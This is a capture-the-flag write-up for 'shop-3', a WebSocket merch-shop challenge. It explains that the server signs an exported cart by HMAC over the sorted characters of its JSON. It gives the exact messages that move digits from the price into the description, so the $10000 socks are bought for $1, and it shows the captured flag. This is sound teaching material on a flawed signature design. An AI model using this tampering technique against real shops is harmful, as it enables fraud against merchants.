# shop-3
Author: null

Flag: `EPT{r3m3mb3r_t0_cl4im_y0ur_hq_ept_s0ck5!}`
## Description
```
Welcome to the new and improved EPT Merch Shop! Apparently last years version had a few bugs in it, but is should hopefully be all fixed now!

[https://shop.ept.gg/](https://shop.ept.gg/)
```

## Provided challenge files
* [shop.tar.gz2](shop.tar.gz2)

## Solution
### Preface
We got given the url https://shop.ept.gg/ and the archive `shop.tar.gz2` containing the code of the challenge. Based on it not being on-demand, it seemed likely that we wouldn't have any input that would persist between clients.

When accessing the page, we could see that we had a wallet of $100, and two items were for sale. `Meme` for $60 and `EPT Socks` for $10000.

### Solving the challenge

I started by jumping into the code and doing a quick review of its functionallity. The code was a single python script, and since I'm quite comfortable with python, I assumed it would go quite quick.


#### First assumption - Race condition
My first assumption without looking at the code was that it would be related to some kind of race condition, because it's the sort of challenge that often have such an component.

So I started out by reviewing the code, to look for ways that would indicate such a vulnerability existed.

I first looked at what functionallity existed, and I saw that all the functionallity was in the `WebSocket` portion of the application.
I gathered a list of all the functionallity or `types` as they are called in the source code; `status`,`cart`,`remove`, `checkout`, `export`,  `resume` and `flag`.

Since I wasn't quite sure where the exploit would begin, I started at the end of the chain and tried to backtrack from the `flag` functionallity.
```py
elif msg['type'] == 'flag':
    if any(item['name'] == 'EPT Socks' for item in session['inventory']):
        ws.send(json.dumps({'type': 'flag', 'flag': open('/flag.txt').read()}))
        app.logger.info(f'Someone got the flag! {addr=}, {msg=}')
    else:
        ws.send(json.dumps({'type': 'error', 'message': 'Only those wearing cool EPT socks may enter!'}))
```

We see that when doing the `flag` command, it goes through every item in our session's inventory, and checks if any of them has the name `EPT Socks` and if it does, it returns the flag to us. So now we know that we somehow, need to get the flag into our inventory.

Continuing to persue, my first hypothesis on the attack vector, I tried to look for parts of the code that could be vulnerable to a race condition flaw. Since there is no sell functionallity, we know that the only real other possibility is that there would be a race condition flaw in the `checkout` (purchase) functionallity.

So I started to review the code.
```py
elif msg['type'] == 'checkout':
    cart = session.get('cart', [])
    price = sum(item['price'] for item in cart)
    if price > session['money']:
        ws.send(json.dumps({'type': 'error', 'message': 'You cannot afford all those items!'}))
        continue
    session['money'] -= price
    session['inventory'].extend(cart)
    session['cart'] = []
    ws.send(json.dumps({'type': 'status', 'money': session['money'], 'cart': session['cart'], 'inventory': session['inventory']}))
```

We see that it first assigns the session's cart to the `cart` variable. It then continues to get the price based on the `cart` variable, checks if the session has enough money and then subtracts the cost, and adds the `cart` variable to the inventory and updates the client.

This code is potentially vulnerable to a race condition where it is possible to buy items you have funds for multiple times, but it seems unlikely. This also doesn't help us, as we don't have any sell functionallity, so getting extra of the `meme` item doesn't help us.

#### Forgetting to debug
I now felt that I had disproven that there was a race condition. So I had to look for some other flaw I could abuse. Looking back at the list of `types` there were two others that stood out as potentially interesting. That was `export` and `resume`, I had seen them earlier, but looked passed it since it used `hmac` and a secure secret to secure it. But this seemed like the most plausable vulnerable functionallity, so I took another look.

```py
elif msg['type'] == 'export':
    ws.send(json.dumps({'type': 'export', **export(session['cart'])}))
elif msg['type'] == 'resume':
    if msg['hmac'] == export(msg['cart'])['hmac']:
        session['cart'] = msg['cart']
        ws.send(json.dumps({'type': 'resume', 'cart': session['cart']}))
    else:
        ws.send(json.dumps({'type': 'error', 'message': 'Invalid hmac!'}))
```

First I took a look at `resume`, and see that the `hmac` input gets checked against the `hmac` from the result of export which seems correct, and that it then loads the message cart into the session. This seemed correct.

The `export` type just returned the results of the export function, so if there is a flaw, it was bound to be in the `export` function. So that's were I looked next.
```py
def export(cart):
    cart = json.dumps(cart, sort_keys=True)
    return {'cart': cart, 'hmac': hmac.new(app.secret_key, json.dumps(sorted(cart)).encode(), hashlib.sha256).hexdigest()}
```

With the first look at this function, the hmac function stood out to me, so instead of doing the smart thing, and actually starting the application and printing some debug statements, I spent a long time trying to test different payloads for tricking the HMAC by duplicating the keys and values of the JSON object. That was a wasted effort, but I later returned to doing some actual debugging.

#### Debugging and solving the challenge
After a lot of trial and error, I decided to start understanding better how the values of the hmac actually was created.
So as the "professional" coder I am I added all the print statements I needed to debug the application and reorganzied the code a little;
```py
def export(cart):
    cart = json.dumps(cart, sort_keys=True)
    print("Cart:", end="")
    print(cart)
    print("sorted Cart:", end="")
    print(json.dumps(sorted(cart)))

    return {'cart': cart, 'hmac': hmac.new(app.secret_key, json.dumps(sorted(cart)).encode(), hashlib.sha256).hexdigest()}
```

I then ran it locally, and tried to add an item to my cart and exporting it. I got the following output in the console, and immediately realized that the indivdual characters in the stringified cart string was sorted. So as long as I kept the same characters I could move them around as I saw fit.

```
Cart:[{"description": "Don't you dare lose your EPT Socks!", "image": "/meme.png", "name": "Meme", "price": 60, "stars": 3}]
sorted Cart:[" ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", "!", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "\"", "'", ",", ",", ",", ",", ".", "/", "0", "3", "6", ":", ":", ":", ":", ":", "D", "E", "M", "P", "S", "T", "[", "]", "a", "a", "a", "a", "c", "c", "c", "d", "d", "e", "e", "e", "e", "e", "e", "e", "e", "e", "e", "g", "g", "i", "i", "i", "i", "k", "l", "m", "m", "m", "m", "m", "n", "n", "n", "n", "o", "o", "o", "o", "o", "o", "p", "p", "p", "r", "r", "r", "r", "r", "s", "s", "s", "s", "s", "t", "t", "t", "u", "u", "y", "y", "{", "}"]

```

I initially did the conceptually easiest solution, and added one `meme` and one `socks` item to my cart, exported, switched the prices, removed meme, and bought `socks` but there is an easier solution.

First add socks to cart.
```json
{"type": "cart",
	"item": "socks"
}
```
Then export the cart.
```json
{"type": "export"}

----
{"type": "export", "cart": "[{\"description\": \"<p>The demand has been high on the next edition of the EPT merchendice. Say hello to the new EPT Socks!</p> Remember to claim your pair physically at the admin booth after solving the challenge!\", \"image\": \"/socks.png\", \"name\": \"EPT Socks\", \"price\": 10000, \"stars\": 5}]", "hmac": "b221a7a133ca9da20e597d2f1003539a06fef94dc16eb6de7fb27387ac301607"}
```

Then verify that it works to resume that cart without editing:
```json
{"type": "resume","cart":[{"description": "<p>The demand has been high on the next edition of the EPT merchendice. Say hello to the new EPT Socks!</p> Remember to claim your pair physically at the admin booth after solving the challenge!", "image": "/socks.png", "name": "EPT Socks", "price": 10000, "stars": 5}], "hmac": "b221a7a133ca9da20e597d2f1003539a06fef94dc16eb6de7fb27387ac301607"}
```

Since that succeeded, we can then try to move the values, so that we get a little better price.

```json
{"type": "resume","cart":[{"description": "<p>The demand has been high on the next edition of the EPT merchendice. Say hello to the new EPT Socks!</p> Remember to claim your pair physically at the admin booth after solving the challenge!0000", "image": "/socks.png", "name": "EPT Socks", "price": 1, "stars": 5}], "hmac": "b221a7a133ca9da20e597d2f1003539a06fef94dc16eb6de7fb27387ac301607"}

---

{"type": "resume", "cart": [{"description": "<p>The demand has been high on the next edition of the EPT merchendice. Say hello to the new EPT Socks!</p> Remember to claim your pair physically at the admin booth after solving the challenge!0000", "image": "/socks.png", "name": "EPT Socks", "price": 1, "stars": 5}]}
```

And now we can checkout.
```json
{"type": "checkout"}

---
{"type": "status", "money": 99, "cart": [], "inventory": [{"description": "<p>The demand has been high on the next edition of the EPT merchendice. Say hello to the new EPT Socks!</p> Remember to claim your pair physically at the admin booth after solving the challenge!0000", "image": "/socks.png", "name": "EPT Socks", "price": 1, "stars": 5}]}
```
And then get out flag:
```json
{"type": "flag"}
---
{"type": "flag", "flag": "EPT{r3m3mb3r_t0_cl4im_y0ur_hq_ept_s0ck5!}"}
```
